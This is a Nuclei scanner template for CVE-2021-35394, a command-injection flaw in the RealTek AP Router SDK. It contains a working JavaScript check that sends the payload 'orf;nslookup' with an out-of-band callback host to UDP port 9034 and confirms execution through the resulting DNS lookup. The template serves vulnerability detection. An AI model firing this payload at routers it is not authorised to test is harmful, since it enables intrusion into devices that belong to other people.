id: CVE-2021-35394
info:
  author: king-alexander
  classification:
    epss-percentile: 0.99919
    epss-score: 0.9422
  description: The SDK exposes a UDP server that allows remote execution of arbitray
    commands.
  impact: 'Attackers can execute arbitrary commands remotely through the exposed UDP
    server port by sending specially crafted commands to RealTek AP Router SDK devices.

    '
  name: RealTek AP Router SDK - Arbitrary Command Injection
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-35394
  - https://blogs.juniper.net/en-us/threat-research/realtek-cve-2021-35394-exploited-in-the-wild
  remediation: Apply the latest security patches or updates provided by RealTek.
  severity: critical
  tags: cve,cve2021,realtek,rce,kev,vkev,vuln
javascript:
- args:
    Host: '{{Host}}'
    OAST: '{{interactsh-url}}'
    Port: 9034
  code: 'let packet = bytes.NewBuffer();

    let message = `orf;nslookup ${OAST}`

    let data = message;

    packet.WriteString(data)

    let c = require("nuclei/net");

    let conn = c.Open(''udp'', `${Host}:${Port}`);

    conn.SendHex(packet.Hex());

    '
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  pre-condition: 'isUDPPortOpen(Host,Port);

    '
